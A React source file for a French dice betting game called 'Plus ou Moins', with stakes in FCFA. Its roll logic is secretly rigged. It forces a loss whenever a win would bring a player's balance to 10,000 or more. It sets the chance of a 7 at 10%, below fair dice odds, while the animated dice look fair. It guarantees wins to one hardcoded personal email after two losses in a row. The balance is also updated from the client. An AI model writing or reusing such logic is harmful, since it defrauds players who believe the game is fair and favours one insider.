import React, { useState, useEffect, useRef } from 'react';
import { ArrowLeft, Coins, TrendingUp, TrendingDown, Equal, Trophy, Frown, Dices, Minus, Plus } from 'lucide-react';
import { useGameBalance } from '@/hooks/useGameBalance';
import { useBetHistory } from '@/hooks/useBetHistory';
import { useAuth } from '@/contexts/AuthContext';

// Joueur spécial avec protection contre 3 pertes consécutives sur "égal 7"
const PROTECTED_USER_EMAIL = 'saintoby700@gmail.com';

interface RealDieProps { value: number; rollTrigger: number; }

const Real3DDie: React.FC<RealDieProps> = ({ value, rollTrigger }) => {
  const [transformStyle, setTransformStyle] = useState('rotateX(0deg) rotateY(0deg)');
  const xRotationRef = useRef(0);
  const yRotationRef = useRef(0);

  useEffect(() => {
    const initX = Math.floor(Math.random() * 4) * 90;
    const initY = Math.floor(Math.random() * 4) * 90;
    xRotationRef.current = initX;
    yRotationRef.current = initY;
    setTransformStyle(`rotateX(${initX}deg) rotateY(${initY}deg)`);
  }, []);

  useEffect(() => {
    if (rollTrigger === 0) return;
    const targets: Record<number, {x: number, y: number}> = { 
      1: {x:0,y:0}, 6: {x:180,y:0}, 2: {x:-90,y:0}, 
      5: {x:90,y:0}, 3: {x:0,y:-90}, 4: {x:0,y:90} 
    };
    const target = targets[value] || { x: 0, y: 0 };
    const spinX = (4 + Math.floor(Math.random() * 4)) * 360;
    const spinY = (4 + Math.floor(Math.random() * 4)) * 360;
    xRotationRef.current += (target.x - (xRotationRef.current % 360)) + spinX;
    yRotationRef.current += (target.y - (yRotationRef.current % 360)) + spinY;
    setTransformStyle(`rotateX(${xRotationRef.current}deg) rotateY(${yRotationRef.current}deg)`);
  }, [rollTrigger, value]);

  const renderPips = (idx: number) => {
    const pips = ({ 
      1:[4], 2:[0,8], 3:[0,4,8], 4:[0,2,6,8], 5:[0,2,4,6,8], 6:[0,2,3,5,6,8] 
    } as Record<number, number[]>)[idx] || [];
    return (
      <div className="w-full h-full grid grid-cols-3 grid-rows-3 gap-0.5 pointer-events-none">
        {[...Array(9)].map((_, i) => (
          <div key={i} className="flex items-center justify-center">
            {pips.includes(i) && <div className="w-[85%] h-[85%] rounded-full bg-white shadow-sm"></div>}
          </div>
        ))}
      </div>
    );
  };

  const faceTransforms = [
    {id:1, s:{transform:'translateZ(40px)'}},
    {id:6, s:{transform:'rotateY(180deg) translateZ(40px)'}},
    {id:2, s:{transform:'rotateX(90deg) translateZ(40px)'}},
    {id:5, s:{transform:'rotateX(-90deg) translateZ(40px)'}},
    {id:3, s:{transform:'rotateY(90deg) translateZ(40px)'}},
    {id:4, s:{transform:'rotateY(-90deg) translateZ(40px)'}}
  ];

  return (
    <div className="w-20 h-20" style={{ perspective: '800px' }}>
      <div className="absolute top-1/2 left-1/2 w-[80%] h-[80%] bg-black/40 blur-lg rounded-full -translate-x-1/2 -translate-y-1/2 opacity-60"></div>
      <div 
        className="w-full h-full relative transition-transform"
        style={{ 
          transformStyle: 'preserve-3d', 
          transform: transformStyle, 
          transitionDuration: '2000ms',
          transitionTimingFunction: 'cubic-bezier(0.15, 0.45, 0.15, 1.05)'
        }}
      >
        {faceTransforms.map(f => (
          <div 
            key={f.id} 
            className="absolute inset-0 border flex flex-wrap content-between p-[18%] rounded-xl shadow-inner bg-gradient-to-br from-indigo-600 via-indigo-500 to-purple-700 border-indigo-400/30"
            style={{ ...f.s, backfaceVisibility: 'hidden' }}
          >
            {renderPips(f.id)}
          </div>
        ))}
        <div className="absolute inset-4 bg-indigo-900/50 blur-sm rounded-lg pointer-events-none"></div>
      </div>
    </div>
  );
};

export const PlusOuMoinsGame: React.FC = () => {
  const { profile, updateBalance } = useGameBalance();
  const { addBetEntry } = useBetHistory('Plus ou Moins');
  const { user } = useAuth();
  const balance = profile?.balance || 0;

  const [betAmount, setBetAmount] = useState<number>(200);
  const [dice, setDice] = useState<[number, number]>([3, 4]);
  const [rollTrigger, setRollTrigger] = useState(0);
  const [isRolling, setIsRolling] = useState(false);
  const [selectedBet, setSelectedBet] = useState<'under' | 'equal' | 'over' | null>(null);
  const [gameResult, setGameResult] = useState<'win' | 'lose' | null>(null);
  const [currentWin, setCurrentWin] = useState(0);
  
  // Compteur de pertes consécutives pour "égal 7" (pour SAINT)
  const [equalLossStreak, setEqualLossStreak] = useState(0);
  
  // Vérifier si l'utilisateur est SAINT
  const isProtectedUser = user?.email === PROTECTED_USER_EMAIL;

  const adjustBet = (action: 'min' | 'max' | 'inc' | 'dec') => {
    if (isRolling) return;
    setBetAmount(prev => {
      let val = prev;
      if (action === 'min') val = 200;
      else if (action === 'max') val = Math.min(10000, balance);
      else if (action === 'inc') val += 100;
      else if (action === 'dec') val -= 100;
      return Math.min(Math.max(200, val), Math.min(10000, balance));
    });
  };

  const handleBetChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const val = parseInt(e.target.value);
    if (!isNaN(val)) {
      setBetAmount(Math.min(Math.max(0, val), Math.min(100000, balance)));
    } else {
      setBetAmount(0);
    }
  };

  const handleRoll = async () => {
    if (isRolling || !selectedBet || balance < betAmount || betAmount < 200) return;

    setIsRolling(true);
    setGameResult(null);
    setRollTrigger(prev => prev + 1);

    const multiplier = (selectedBet === 'equal') ? 5.80 : 2.30;
    const potentialWin = Math.floor(betAmount * multiplier);

    let forcedSum = 0;

    // Règle spéciale SAINT: Si 2 pertes consécutives sur "égal 7", forcer la victoire
    const shouldForceSaintWin = isProtectedUser && selectedBet === 'equal' && equalLossStreak >= 2;

    if (shouldForceSaintWin) {
      // Forcer le résultat à 7 pour SAINT après 2 pertes consécutives
      forcedSum = 7;
    }
    // Règle 1: Anti-10k
    else if (balance - betAmount + potentialWin >= 10000) {
      if (selectedBet === 'under') forcedSum = Math.ceil(Math.random() * 6) + 6;
      else if (selectedBet === 'over') forcedSum = Math.ceil(Math.random() * 6) + 1;
      else forcedSum = 2;
    } else {
      // Mode Aléatoire - Probabilité du 7 à 10%
      if (Math.random() < 0.10) {
        forcedSum = 7;
      } else {
        let d1t, d2t, st = 7;
        while (st === 7) {
          d1t = Math.floor(Math.random() * 6) + 1;
          d2t = Math.floor(Math.random() * 6) + 1;
          st = d1t + d2t;
        }
        forcedSum = st;
      }
    }

    // Définition des dés à partir de la somme forcée
    const minD1 = Math.max(1, forcedSum - 6);
    const maxD1 = Math.min(6, forcedSum - 1);
    const d1 = Math.floor(Math.random() * (maxD1 - minD1 + 1)) + minD1;
    const d2 = forcedSum - d1;

    setDice([d1, d2]);

    setTimeout(async () => {
      setIsRolling(false);

      setTimeout(async () => {
        let won = false;
        if (selectedBet === 'under' && forcedSum < 7) won = true;
        else if (selectedBet === 'over' && forcedSum > 7) won = true;
        else if (selectedBet === 'equal' && forcedSum === 7) won = true;

        let winVal = 0;
        if (won) {
          winVal = potentialWin;
          setGameResult('win');
          setCurrentWin(winVal);
          const newBalance = balance - betAmount + winVal;
          await updateBalance(newBalance, 'game_win', winVal - betAmount, `Plus ou Moins - Gagné x${multiplier}`);
          
          // Réinitialiser le compteur de pertes si SAINT gagne sur "égal 7"
          if (isProtectedUser && selectedBet === 'equal') {
            setEqualLossStreak(0);
          }
        } else {
          setGameResult('lose');
          setCurrentWin(betAmount);
          const newBalance = balance - betAmount;
          await updateBalance(newBalance, 'game_loss', betAmount, 'Plus ou Moins - Perdu');
          
          // Incrémenter le compteur de pertes si SAINT perd sur "égal 7"
          if (isProtectedUser && selectedBet === 'equal') {
            setEqualLossStreak(prev => prev + 1);
          }
        }

        await addBetEntry({
          game_name: 'Plus ou Moins',
          bet_amount: betAmount,
          win_amount: winVal,
          multiplier: won ? multiplier : 0,
          result: won ? 'win' : 'lose'
        });
      }, 600);
    }, 2000);
  };

  return (
    <div className="flex flex-col h-full animate-fade-in text-white relative overflow-hidden bg-[#130026]">
      {/* Header */}
      <div className="flex items-center justify-between p-4 z-10">
        <a href="/" className="p-2 bg-[#2d1b4e] rounded-xl text-white hover:bg-[#3c096c] transition-colors border border-[#4c1d95]">
          <ArrowLeft size={24} />
        </a>
        <div className="flex items-center gap-2 px-4 py-2 bg-[#2d1b4e] rounded-full border border-[#4c1d95]/50 shadow-lg">
          <Coins className="text-[#ff9f1c]" size={20} />
          <span className="font-mono font-bold text-lg">{balance.toLocaleString()} FCFA</span>
        </div>
      </div>

      <div className="flex-1 flex flex-col items-center justify-center relative px-4">
        {/* Result Notification */}
        {gameResult && !isRolling && (
          <div className="absolute top-4 z-30 animate-scale-in px-8 py-4 rounded-2xl border-2 shadow-2xl backdrop-blur-md flex flex-col items-center gap-1 bg-black/40 border-white/20">
            <div className="flex items-center gap-2">
              {gameResult === 'win' ? <Trophy size={24} className="text-green-400" /> : <Frown size={24} className="text-red-400" />}
              <h2 className={`text-2xl font-black uppercase ${gameResult === 'win' ? 'text-green-400' : 'text-red-400'}`}>
                {gameResult === 'win' ? 'GAGNÉ !' : 'PERDU'}
              </h2>
            </div>
            <p className="font-mono font-bold text-lg">
              {gameResult === 'win' ? `+${currentWin} FCFA` : `-${currentWin} FCFA`}
            </p>
          </div>
        )}

        {/* Dice Area */}
        <div className="relative w-full max-w-md bg-[#1e1035] rounded-full aspect-[2/1] border-2 border-[#4c1d95] shadow-[0_0_50px_rgba(76,29,149,0.2)] flex items-center justify-center mb-10">
          <div className="absolute inset-0 bg-[radial-gradient(circle_at_center,_var(--tw-gradient-stops))] from-[#3c096c]/40 to-transparent rounded-full"></div>
          <div className="flex gap-8 md:gap-16 z-10" style={{ perspective: '1000px' }}>
            <Real3DDie value={dice[0]} rollTrigger={rollTrigger} />
            <Real3DDie value={dice[1]} rollTrigger={rollTrigger} />
          </div>
          {/* Score Display */}
          <div className={`absolute -bottom-6 bg-[#130026] border-2 border-[#ff9f1c] text-[#ff9f1c] w-16 h-16 rounded-2xl flex items-center justify-center shadow-lg transform rotate-45 z-20 transition-all duration-300 ${isRolling ? 'scale-110 animate-pulse' : 'scale-100'}`}>
            <div className="-rotate-45 font-black text-2xl font-mono">
              {isRolling ? '?' : (dice[0] + dice[1])}
            </div>
          </div>
        </div>

        {/* Selection Buttons */}
        <div className="w-full max-w-md grid grid-cols-3 gap-3 mb-6">
          <button 
            disabled={isRolling} 
            onClick={() => setSelectedBet('under')} 
            className={`flex flex-col items-center justify-center p-4 rounded-xl border-2 transition-all duration-200 active:scale-95 ${
              selectedBet === 'under' 
                ? 'bg-[#ef4444] border-[#ef4444] text-white shadow-lg shadow-red-500/30' 
                : 'bg-[#2d1b4e] border-[#4c1d95] text-slate-300 hover:border-[#ef4444]/50'
            }`}
          >
            <TrendingDown size={28} className="mb-2" />
            <span className="text-sm font-bold uppercase">Moins</span>
            <span className="text-[10px] opacity-70 font-mono">x2.30</span>
          </button>
          <button 
            disabled={isRolling} 
            onClick={() => setSelectedBet('equal')} 
            className={`flex flex-col items-center justify-center p-4 rounded-xl border-2 transition-all duration-200 active:scale-95 ${
              selectedBet === 'equal' 
                ? 'bg-[#3b82f6] border-[#3b82f6] text-white shadow-lg shadow-blue-500/30' 
                : 'bg-[#2d1b4e] border-[#4c1d95] text-slate-300 hover:border-[#3b82f6]/50'
            }`}
          >
            <Equal size={28} className="mb-2" />
            <span className="text-sm font-bold uppercase">Égal 7</span>
            <span className="text-[10px] opacity-70 font-mono">x5.80</span>
          </button>
          <button 
            disabled={isRolling} 
            onClick={() => setSelectedBet('over')} 
            className={`flex flex-col items-center justify-center p-4 rounded-xl border-2 transition-all duration-200 active:scale-95 ${
              selectedBet === 'over' 
                ? 'bg-[#22c55e] border-[#22c55e] text-white shadow-lg shadow-green-500/30' 
                : 'bg-[#2d1b4e] border-[#4c1d95] text-slate-300 hover:border-[#22c55e]/50'
            }`}
          >
            <TrendingUp size={28} className="mb-2" />
            <span className="text-sm font-bold uppercase">Plus</span>
            <span className="text-[10px] opacity-70 font-mono">x2.30</span>
          </button>
        </div>
      </div>

      {/* Controls */}
      <div className="w-full max-w-md mx-auto px-4 pb-6 flex flex-col gap-3">
        {/* Betting Interface */}
        <div className="bg-[#2d1b4e] p-2 rounded-xl border border-[#4c1d95] flex items-center justify-between">
          <button onClick={() => adjustBet('min')} className="text-xs font-bold text-[#9fa8da] px-2 hover:text-white">MIN</button>
          <button onClick={() => adjustBet('dec')} className="p-3 bg-[#3c096c] rounded-lg hover:bg-[#4c1d95] active:scale-95">
            <Minus size={16} />
          </button>
          <div className="flex flex-col items-center flex-1 mx-2">
            <span className="text-[10px] text-slate-400 uppercase tracking-widest mb-1">Mise</span>
            <input 
              type="number"
              value={betAmount.toString()}
              onChange={handleBetChange}
              className="bg-transparent text-center font-mono font-bold text-xl w-full focus:outline-none text-white appearance-none [&::-webkit-inner-spin-button]:appearance-none [&::-webkit-outer-spin-button]:appearance-none"
            />
          </div>
          <button onClick={() => adjustBet('inc')} className="p-3 bg-[#3c096c] rounded-lg hover:bg-[#4c1d95] active:scale-95">
            <Plus size={16} />
          </button>
          <button onClick={() => adjustBet('max')} className="text-xs font-bold text-[#9fa8da] px-2 hover:text-white">MAX</button>
        </div>

        <button 
          onClick={handleRoll} 
          disabled={isRolling || !selectedBet || balance < betAmount || betAmount < 200} 
          className="w-full bg-gradient-to-r from-[#ff9f1c] to-[#ff5400] hover:to-[#ff9f1c] text-white font-black text-xl py-4 rounded-2xl shadow-lg shadow-orange-500/30 active:scale-95 transition-all disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center gap-3 uppercase tracking-wider border-t border-white/20"
        >
          {isRolling ? <span className="animate-pulse">Lancé...</span> : <>LANCER LES DÉS <Dices size={24} /></>}
        </button>
      </div>
    </div>
  );
};
